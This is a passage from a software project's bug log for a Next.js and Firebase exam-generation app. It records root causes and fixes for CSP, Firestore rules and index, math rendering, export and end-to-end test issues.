**Area:** Testing / Upgrade
**Reported:** 2026-09-18
**Fixed:** 2026-09-18

**Description:** `e2e/phases/phase-8-pricing-upgrade-misc.spec.ts:82` ("WhatsApp path opens a wa.me deep link and shows the success screen") asserted `popup.url()` matched `/wa\.me/`, but QA observed the popup resolving to `https://api.whatsapp.com/send/?phone=...` instead. The app itself (`src/app/upgrade/page.tsx`) still calls `window.open(\`https://wa.me/${WHISH_NUMBER}?text=${msg}\`, "_blank")` unchanged — `wa.me` is WhatsApp's own shortlink domain, which 302-redirects to `api.whatsapp.com/send/?phone=...`. The test's synchronous `popup.url()` check immediately after `context.waitForEvent("page")` used to catch the URL before that redirect landed; evidently it can now land fast enough (or the browser/network conditions changed) that the popup's URL has already advanced past `wa.me` by the time the assertion runs.
**Root cause:** Test-only issue, not an app bug — no app code (`src/app/upgrade/page.tsx`) needed to change; the WhatsApp deep-link the app requests is still `wa.me`, but the test was asserting on a URL that's an external redirect hop, not one the app controls.
**Fix:** Added `await popup.waitForURL(/api\.whatsapp\.com\/send|wa\.me/, { timeout: 8_000 }).catch(() => {})` before the assertion (bounded wait so a slow/blocked external redirect can't hang the test), and broadened the assertion regex to accept either `wa.me` or `api.whatsapp.com/send`. Deliberately avoided `waitForLoadState()` for the popup — first attempt at the fix used it and it hung until the test's own 30s timeout in this environment's network conditions, since it blocks on the real external domain's full page load. Verified with `npx playwright test e2e/phases/phase-8-pricing-upgrade-misc.spec.ts -g "WhatsApp path"` — 1 passed. No production code changed.

---

## BUG-014: CSP `script-src` blocks Google Analytics/GTM — `gtag.js` fails to load

**Status:** Fixed
**Severity:** Medium
**Area:** Analytics / Security
**Reported:** 2026-09-18
**Fixed:** 2026-09-18

**Description:** Google Analytics (GTM) is silently broken by the app's own Content-Security-Policy. The browser blocks the request to load `https://www.googletagmanager.com/gtag/js?id=G-7DZ1T3P599`, so no analytics events are ever sent, with no visible error to the end user (only a CSP violation in the browser console). This also causes an e2e smoke test, `landing page loads without errors`, to fail intermittently (the console-error assertion catches the blocked-script CSP violation).
**Steps to reproduce:**
1. Load any page of the app in a browser with devtools open.
2. Check the Console/Network tab — a CSP violation is logged for `https://www.googletagmanager.com/gtag/js?id=G-7DZ1T3P599`, and the script fails to load (status blocked, not a network error).
3. No `gtag`/GA4 events fire afterward.
4. Run the e2e suite's `landing page loads without errors` smoke test — it can fail intermittently due to this same blocked-resource console error.
**Root cause:** Two separate CSP definitions exist, and the original diagnosis only named one of them. `createSecurityHeaders()` in `src/lib/security.ts` sets a `Content-Security-Policy` header whose `script-src` allowlist (`'self' 'unsafe-eval' 'unsafe-inline' https://apis.google.com https://*.firebaseapp.com https://*.google.com https://va.vercel-scripts.com`) did not include `https://www.googletagmanager.com` — but that function is only ever called from API route handlers, whose response headers don't govern the browser's CSP enforcement on the navigated HTML document. The CSP that actually gets enforced on every page load (including the landing page) is built independently and inline inside `src/proxy.ts` (Next.js 16's `middleware.ts`-equivalent convention, matched against all non-`/api` routes) — confirmed by curling a local dev server and diffing the returned `content-security-policy` header against both source files. `proxy.ts`'s `script-src` had the same gap. Traced the GA/GTM wiring itself via `git log -S googletagmanager` to commit `a410d51` ("integrate Google Analytics") — the CSP allowlists were never updated to allow it in either file, so the policy has blocked it from day one. Pre-existing, unrelated to the `imtihan.live` apex-domain migration.
**Fix:** Added `https://www.googletagmanager.com` to `script-src`, and `https://www.google-analytics.com`, `https://*.google-analytics.com`, `https://*.analytics.google.com` to `connect-src`, in **both** `src/proxy.ts` (the one actually enforced on page navigations) and `createSecurityHeaders()` in `src/lib/security.ts` (kept consistent even though it's currently only wired to API JSON responses, to avoid the same trap resurfacing if it's ever applied to page responses). Verified: (1) curled a local dev server (`localhost:3000`, then `localhost:3005` under the Playwright-managed `next dev --turbopack` instance) and read the raw `content-security-policy` response header back — confirmed both new domains present. (2) Ran a one-off Playwright script against the live page that recorded every network response matching `googletagmanager.com` / `google-analytics.com` / `analytics.google.com`: `gtag.js` loaded with `200`, and the GA4 beacon (`https://www.google-analytics.com/g/collect?...&en=page_view...`) fired and returned `204` (GA4's normal success response for `/g/collect`, not an error) — so this is a genuine network-level confirmation the hit landed, not just a CSP-permits-it check. Zero console/page errors were captured during that run. (3) Ran `e2e/smoke.spec.ts`'s `landing page loads without errors` twice in isolation (both green) and the full 12-test `smoke.spec.ts` file once (12/12 green) via `npx playwright test`. (4) `npm run type-check` clean (no code paths changed beyond the two CSP header strings).

---

## BUG-015: Stale test assertion in `generate-prompts.test.ts` didn't match the (intentionally restored) `[id: ...]` chapter tags

**Status:** Fixed
**Severity:** Low
**Area:** Testing / Generation
**Reported:** 2026-09-18
**Fixed:** 2026-09-18

**Description:** QA's full-suite run flagged `src/__tests__/generate-prompts.test.ts` (chapter-coverage "packs multiple chapters into one exercise" case) failing: it asserted the literal string `- Exercise 1 → "Nombres complexes" + "Équations différentielles"...` but `buildChapterDistribution()` in `src/lib/prompts/generate.ts` actually emits `"Nombres complexes" [id: ter-math-complex] + ...` — an inline machine-readable id tag per chapter.
**Root cause:** Not a regression. `git log -S` traced the `[id: ...]` tagging to PR #8, "restore-chapter-id-tagging" (commit `5487cc8`), which deliberately restored the id tags so the model copies real curriculum ids verbatim into each exercise's `chapterIds` field instead of guessing/hallucinating them (see CLAUDE.md §4 anti-hallucination rule). The test predates that restore and was never updated to match.
**Fix:** Updated the assertion in `generate-prompts.test.ts` to expect the current output including both chapters' `[id: ...]` tags and the current "include ALL of their ids in that exercise's chapterIds" instruction text. No production code changed. Full suite now green (60/60), `npm run type-check` clean.

---

## BUG-013: "My School" bank silently shows empty — missing Firestore composite index for `schoolBank` queries

**Status:** Fixed — index deployed and confirmed working
**Severity:** High
**Area:** Data / Bank
**Reported:** 2026-09-18
**Fixed:** 2026-09-27 — founder ran `firebase deploy --only firestore:indexes` (`FOUNDER_DECISIONS.md` #6). "My School" tab confirmed working by the founder post-deploy.

**Description:** Every Pro teacher who sets a school and opens `/bank`'s "My School" tab silently sees an empty shared-exercises list instead of their colleagues' real contributions, with no error shown to the user — `getSchoolBankExercises()` (`src/app/bank/page.tsx`) catches the failure and returns `[]`. Surfaced via the dev server's own console output while re-running a Phase 5 e2e test (`FirebaseError: The query requires an index`), not via any user report — this is a genuinely broken feature, not a test artifact.
**Root cause:** The query is `where("schoolSlug", "==", slug).orderBy("sharedAt", "desc")` on the `schoolBank` collection — Firestore requires a composite index for a query that combines an equality filter with an `orderBy` on a different field, and `firestore.indexes.json` only defined a *different* composite index for this collection (`curriculumId` + `subject` + `exercise.chapterIds`, used by a separate cross-school lookup), never one covering `schoolSlug` + `sharedAt`. Same class of issue as BUG-011: the deployed Firestore config silently doesn't match what the app's own queries need, masked here by the query's own try/catch swallowing the error into an empty array instead of surfacing it.
**Fix:** Added the missing composite index (`schoolSlug` ASC, `sharedAt` DESC) to `firestore.indexes.json`.
**Update (2026-09-29, database, doc-reconciliation pass):** Per `FOUNDER_DECISIONS.md` #6 (answered 2026-09-27), the founder ran `firebase deploy --only firestore:indexes` himself and confirmed the "My School" tab working live. Re-confirmed on disk: `firestore.indexes.json` still contains this exact `schoolSlug` ASC + `sharedAt` DESC composite on `schoolBank`, matching what was described as deployed — repo state and the founder's decision agree. Closing the "not yet deployed" language, which had gone stale after the deploy actually happened. (Note: this bug's fix was index-only, no `firestore.rules` change — so, unlike BUG-026 below, there's no separate rules-deploy question for this one.)

## BUG-012: Double-click-to-edit-raw-LaTeX never worked in Chromium for math nodes (and any other atomic contenteditable block)

**Status:** Fixed
**Severity:** Medium
**Area:** UI / Generation (ExerciseEditor)
**Reported:** 2026-09-18
**Fixed:** 2026-09-18

**Description:** In the exercise editor, double-clicking a KaTeX-rendered math expression (or any other `[data-raw][contenteditable="false"]` atomic block — tables, image/document blocks, "Étape N" step badges) inside a `contenteditable="true"` field was supposed to swap it for its raw markdown/LaTeX source so a teacher could hand-edit it. It never actually worked, in real Chrome/Chromium as well as Playwright — a genuine, reproducible app bug, not a test artifact (confirmed by driving raw `mousedown`/`mouseup` events and by manually mutating the DOM outside any event handler, which worked and stuck).
**Root cause (three compounding issues, all in `ExerciseEditor.tsx`):**
1. Chromium does not reliably synthesize `click`/`dblclick` DOM events for a `contenteditable="false"` island nested inside a `contenteditable="true"` ancestor — `onDoubleClick` silently never fired for these nodes at all (confirmed by capturing every mouse event at the document level: `mousedown`/`mouseup` fired consistently, `click`/`dblclick` did not).
2. Chromium selects such an atomic island as a whole unit on a single click. The field's existing `onMouseUp={fragState.handleSelect}` (for the unrelated "select text, ask AI to rewrite this fragment" feature) treated that as a normal text selection and popped the fragment-regenerate toolbar, and `handleSelect`'s ancestor-based check for this case didn't fire either — Chromium represents the selection's start/end container as the *shared parent*, bracketing the atomic node as a sibling, not as a descendant of it. Every re-render this toolbar triggered replaced the whole `dangerouslySetInnerHTML` subtree with an equivalent-but-different DOM node, so nothing that compared node identity across the two clicks of a double-click could ever match.
3. Once (1) and (2) were fixed and the raw text was actually swapped in during the second `mousedown`, the browser still finalized its own native double-click "select word" behavior on the following `mouseup` — now landing on ordinary text instead of an atomic node — which selected a word of the freshly revealed LaTeX and popped the fragment toolbar again, whose re-render stomped the edit right back to the original KaTeX rendering before Playwright (or a real user) ever saw it.
**Fix:** Replaced the native `onDoubleClick` handler in both `RichField` and `RichFieldInline` with a `useRawReveal()` hook driven off `onMouseDown` click position + timing (two mousedowns on a `[data-raw]` node within 500ms and 8px count as a double-click), since `mousedown` fires reliably where `click`/`dblclick` do not. Guarded `handleSelect` to ignore a selection that exactly brackets a single atomic `[data-raw][contenteditable="false"]` sibling, so it no longer pops the fragment toolbar for these nodes. Added `e.preventDefault()` on the double-click-triggering `mousedown` plus an explicit collapsed-caret selection on the newly inserted text node, so the browser's own native selection algorithm never gets a chance to re-select and re-trigger the toolbar afterward. Verified with 3 consecutive clean runs of the previously-flaky-to-broken test (`phase-3-generation-editor.spec.ts`, "double-clicking the math node in the statement reveals raw LaTeX for editing").

---

## BUG-011: Firestore client reads denied project-wide since 2026-05-20 — Firebase project was still on its auto-generated test-mode rule

**Status:** Fixed
**Severity:** Critical
**Area:** Data / Auth
**Reported:** 2026-09-16
**Fixed:** 2026-09-17

**Description:** Every authenticated user's Firestore client-SDK read of their own profile (`users/{uid}`) failed with "Missing or insufficient permissions," every time, for every user. Console showed `[AuthContext] Firestore listener error — falling back to API`. The app didn't visibly break for real users because `AuthContext.tsx` already had an Admin-SDK-backed `/api/auth/profile` fallback with 15s polling, built for exactly this kind of failure — but every signed-in user was silently running on that slower, non-realtime path the whole time, and any purely client-side Firestore usage elsewhere in the app would have been fully broken.
**Root cause:** The Firebase project's *deployed* Firestore rules were never actually set to the real rules in `firestore.rules` (correct and present in this repo since 2026-07-31, apparently written but never deployed). They were still Firebase's auto-generated "test mode" starter rule from project creation — `allow read, write: if request.time < timestamp.date(2026, 5, 20)` — which unconditionally denies all reads/writes once its hardcoded expiry passes. That expiry was **2026-05-20**, so the entire project had zero working Firestore client access for roughly four months before this was caught by an e2e test failure (see `DAILY_LOG.md`'s 2026-09-16/17 entries for the full diagnostic trail, including two Claude Code safety guardrails — "Production Deploy" and "Modify Shared Resources" — that correctly blocked the AI assistant from running `firebase deploy` or even pre-filling the console's rules editor, requiring the founder to do the actual publish by hand).
**Fix:** Founder published the repo's real `firestore.rules` (per-user `users/{uid}` and `users/{uid}/exams/{examId}` ownership checks, `schoolBank` read for any authenticated user, `student_profiles`/`student_attempts` ownership checks, deny-all fallback) via the Firebase Console. Verified via two previously-failing e2e tests (`phase-8-pricing-upgrade-misc.spec.ts`'s Pro-badge and Scanner pro-tier tests) — both now pass cleanly with normal timing and no permission errors.

---

## BUG-010: Dashboard "Download PDF" produces a corrupt, unopenable file

**Status:** Fixed
**Severity:** Critical
**Area:** Export
**Reported:** 2026-09-16
**Fixed:** 2026-09-16

**Description:** From a saved exam's card on `/dashboard`, clicking "Download PDF" downloaded a file named `<title>.pdf` that no PDF viewer could open. `/create/export`'s own PDF option was unaffected — it opens `/print` (browser print-to-PDF), a completely separate code path.
**Root cause:** `src/app/api/export/route.ts`'s `POST` handler treats `format: "word"` and `format: "pdf"` identically — both call `generateWordDocument()`, which only ever builds real `.docx` (OOXML/ZIP) bytes via the `docx` library. The `format === "pdf"` branch just swaps the response's `Content-Type` to `application/pdf` and the filename extension to `.pdf` without changing the actual bytes, so the downloaded file is DOCX binary data mislabeled as a PDF. `/create/export`'s PDF button never hit this endpoint at all (it opens `/print`, which renders through `src/lib/renderContent.ts`, the live web pipeline, and uses the real browser print dialog) — only `/dashboard`'s "Download PDF" button (`handleDownload("pdf")` in `src/app/dashboard/page.tsx`) called `/api/export` with `format: "pdf"`, so the bug was isolated to that one entry point.
**Fix:** `/dashboard`'s `handleDownload("pdf")` now writes the saved exam's `context`/`exercises`/`templateId` into the same `sessionStorage` keys `/print` reads (`imtihan_context`, `imtihan_exercises`, `imtihan_templateId`) and opens `/print` in a new tab, reusing the already-correct browser-print path instead of the broken server endpoint. `/api/export`'s `format: "pdf"` branch itself is untouched and still exists — a real server-side PDF renderer (`@react-pdf/renderer`, per `CLAUDE.md`'s tech stack table) is still not built; nothing currently calls that branch after this fix, but it should not be wired to a new caller until it actually generates PDF bytes.

---

## BUG-008: \boxed{} final answers with stray internal $ delimiters render as raw LaTeX
**Status:** Fixed
**Severity:** High
**Area:** UI / Generation / Math rendering
**Reported:** 2026-09-03
**Fixed:** 2026-09-03

**Description:** Physics/chemistry corrigés sometimes showed the raw LaTeX code instead of rendered math,
e.g. `\boxed{$y = h$ + x\tan\alpha - \frac{g}{2v_0^2\cos^2\alpha}\,x^2}` appeared verbatim on screen.
**Root cause:** The generation prompt told the AI to wrap final answers as `$\boxed{result}$` (one outer
$...$ pair) but a separate "wrap every variable in $...$" rule caused the AI to also nest `$...$` around
sub-expressions INSIDE the `\boxed{}` braces. `renderContent.ts`'s `splitMath()` naively finds the first
`$` and treats it as a delimiter boundary — it cut straight through the `\boxed{...}` braces, corrupting
the brace matching and leaving everything after the first internal `$` as unrendered raw text.
**Fix:** (1) Added `fixBoxedMath()` in `renderContent.ts` — a brace-depth-aware preprocessing pass that
finds every `\boxed{...}` span (correctly handling nested braces like `\frac{a}{b}` inside), strips any
stray `$` found inside, and ensures the whole expression is wrapped in exactly one outer `$...$` pair
before the normal KaTeX pipeline runs. Runs defensively regardless of what the AI outputs. (2) Clarified
`src/lib/prompts/generate.ts`'s boxed-answer rules to explicitly forbid internal `$` delimiters, with a
right/wrong example. Added 4 new cases (18-21) to `test-render.mjs`'s regression harness — all pass
(21/21 total).

---

## BUG-009: Some selected chapters get zero exercises ("Chapter coverage" warning)
**Status:** Fixed
**Severity:** Medium
**Area:** Generation / Prompts
**Reported:** 2026-09-03
**Fixed:** 2026-09-03

**Description:** When a teacher selected multiple chapters (e.g. "Mécanique — mouvements dans l'espace"
and "Électromagnétisme" among others), the generated exam sometimes had zero exercises tagged with one
or more of the selected chapters — flagged by the `/create/generate` "Chapter coverage" warning ("Some
chapters have no exercise — regenerate individual questions to adjust coverage").
**Root cause:** Unlike difficulty (which gets an explicit per-exercise breakdown — "Easy: 2, Medium: 1,
Hard: 1"), chapters had no equivalent per-exercise assignment. The prompt only said "stay within these
selected chapters" with no requirement that every one of them actually appear, so with a short exercise
count relative to the number of selected chapters, the AI could freely concentrate all exercises on just
1-2 chapters.
**Fix:** Added `buildChapterDistribution()` in `src/lib/prompts/generate.ts` — deterministically maps
every selected chapter to a specific exercise number (round-robin) before generation, mirroring the
difficulty breakdown pattern. When there are more chapters than exercises, multiple chapters are assigned
to the same exercise with an explicit instruction to cover each as a distinct sub-question rather than
dropping any. Verified the distribution algorithm against 6 scenarios (more/fewer/equal chapters vs.
exercises) — every chapter is guaranteed at least one assigned exercise slot in all cases. Also
strengthened the system prompt's chapter-scope rule to reference this mandatory coverage requirement.

---

## BUG-001: Register page syntax error — double `return (` statement
**Status:** Fixed
**Severity:** Critical
**Area:** Auth / UI
**Reported:** 2026-04-24
**Fixed:** 2026-04-24

**Description:** `src/app/auth/register/page.tsx` had a duplicate `return (` statement and an extra stray `</div>`, causing a Turbopack parse error at build time. The page was completely unreachable.
**Root cause:** Manual editing left two consecutive `return (` lines inside `RegisterForm` and an unmatched closing `</div>`.
**Fix:** Rewrote the file in full to restore a single clean `return (` and correct JSX structure.

---

## BUG-002: Google sign-in redirect silently fails — session cookie not set
**Status:** Fixed
**Severity:** High
**Area:** Auth
**Reported:** 2026-04-24
**Fixed:** 2026-04-24

**Description:** Clicking "Continue with Google" on login or register appeared to do nothing — the popup completed but the user was not navigated to the dashboard/create page.
**Root cause (1):** `POST /api/auth/session` was using `cookies()` from `next/headers` to set the `__session` cookie inside a Route Handler. In Next.js 15 App Router, this does not reliably emit a `Set-Cookie` response header on client `fetch` calls. The cookie was never stored in the browser, so the middleware saw no session and immediately redirected back to `/auth/login`.
**Root cause (2):** The client-side `setSessionCookie()` helper did not check `res.ok`, so a 500 response from the session route was swallowed silently and `window.location.assign()` fired without a valid session.
**Fix:** Replaced `cookies().set()` with `response.cookies.set()` on the `NextResponse` object in the route handler. Added `if (!res.ok) throw new Error(...)` in `setSessionCookie()` so failures surface as visible error messages instead of silent loops.

---

## BUG-003: Community page fails to build — unclosed blur-container `<div>`
**Status:** Fixed
**Severity:** Critical
**Area:** UI / Community
**Reported:** 2026-04-24
**Fixed:** 2026-04-24

**Description:** Turbopack reported `Expected '</', got 'jsx text'` at the `</main>` closing tag in `src/app/community/page.tsx`, preventing the build.
**Root cause:** The wrapping `<div className={cn("transition-all duration-700", isFree && "opacity-40 blur-sm ...")}>` opened at line 191 was never closed. Its closing `</div>` was missing before `</main>`.
**Fix:** Added the missing `</div>` immediately before `</main>`.

---

## BUG-004: Export step indicator shows "Step 3 of 5" instead of "Step 5 of 5"
**Status:** Fixed
**Severity:** Low
**Area:** UI / Export
**Reported:** 2026-07-31
**Fixed:** 2026-07-31

**Description:** The export page (`/create/export`) rendered `<StepIndicator current={3} />` and `<StepLabel step={3} />`, so the progress dots showed Step 3 as active and the label read "Step 3 of 5" — visually incorrect for the final step.
**Root cause:** Copy-paste error when the export page was created.
**Fix:** Changed both props to `current={5}` / `step={5}`.

---

## BUG-005: "Include corrigé" email checkbox had no effect
**Status:** Fixed
**Severity:** Medium
**Area:** Export / API
**Reported:** 2026-07-31
**Fixed:** 2026-07-31

**Description:** The export page has an "Include corrigé" checkbox for email delivery (`emailIncludeSolution`) and an "Includes corrigé / Exam only" toggle for Word download (`includeAnswerKey`). Neither value was being honoured — the server always generated documents with the full answer key regardless of the toggle state.
**Root cause (1):** `emailIncludeSolution` was tracked in state but never included in the JSON body sent to `/api/export/send`.
**Root cause (2):** `/api/export/route.ts` `RequestSchema` had no `includeAnswerKey` field, so the value sent by the client was silently dropped.
**Root cause (3):** `generateWordDocument` had no `includeAnswerKey` parameter.
**Fix:** Added `includeAnswerKey` to `RequestSchema`, updated `generateWordDocument` signature to accept it with a default of `true`, added an early return that skips the corrigé section when `false`. Updated `/api/export/send` to accept and forward `includeSolution`. Updated client to pass `includeSolution: emailIncludeSolution` in the email request body.

---

## BUG-006: Math rendering — subscripts, Greek letters, \\text{} appeared as raw LaTeX
**Status:** Fixed
**Severity:** High
**Area:** UI / Generation
**Reported:** 2026-07-30
**Fixed:** 2026-07-31

**Description:** Raw LaTeX strings appeared in the exercise preview, e.g. `Z_0 = $R = 50$ \text{ Ω}$`. The `splitMath` function mishandled odd numbers of `$` delimiters, and the text-segment processor didn't catch `\Omega`, `\text{}`, `\frac{}{}`, or subscripted variables like `R_1`.
**Root cause:** (a) `splitMath` treated unclosed `$` as the start of a math block, creating a huge "math" segment from the stray `$` to the end of the string; (b) the inline safety net only matched `\ce{}`, `\vec{}`, and a handful of other commands — not `\text{}`, Greek letters, or subscripted variable patterns; (c) the final cleanup pass wrapped bare LaTeX in `$...$` strings but never re-rendered them to KaTeX.
**Fix:** Modified `splitMath` to strip the opening delimiter and treat the rest as plain text when no closing delimiter is found. Expanded the inline safety net to auto-wrap: `\text{}`, bare Greek letters (`\Omega`, `\alpha`, etc.), `\frac{A}{B}` (two-brace handling), and subscripted variables (`R_1`, `Z_0`, `U_{CE}` — with `{` in the lookbehind to prevent double-wrapping inside `\cmd{…}` arguments). Removed the broken final-cleanup `$...$` wrapping that was adding delimiters without rendering them. Confirmed with a 17-case regression test (17/17 pass).

---

## BUG-007: Landing page buttons and cards had stale indigo drop-shadow colours
**Status:** Fixed
**Severity:** Low
**Area:** UI / Landing
**Reported:** 2026-07-31
**Fixed:** 2026-07-31

**Description:** Button hover shadows and card hover shadows on the landing page used hardcoded `rgba(79,70,229,…)` — the old indigo accent — even after the accent was reverted to emerald `#1a5e3f`. The shadows glowed indigo/purple instead of emerald on hover.
**Root cause:** The previous colour revert fixed CSS variables (`--accent` → emerald) but missed 7 hardcoded `rgba()` values in Tailwind arbitrary shadow classes in `page.tsx`, `Button.tsx`, and `LandingNav.tsx`.
**Fix:** Replaced all 7 occurrences with `rgba(26,94,63,…)` (emerald equivalent). The `indigo-600` in `renderContent.ts` step-badge colour rotation is intentional and was left unchanged.

---

## Reporting a Bug

1. Check this file first — it might already be documented.
2. Check `CLAUDE.md` section 12 "Known Gotchas" — might be a known env issue.
3. If new, add an entry above with the next BUG-XXX number.
4. If urgent (crash / data loss), mark as **Critical** and fix before any other work.
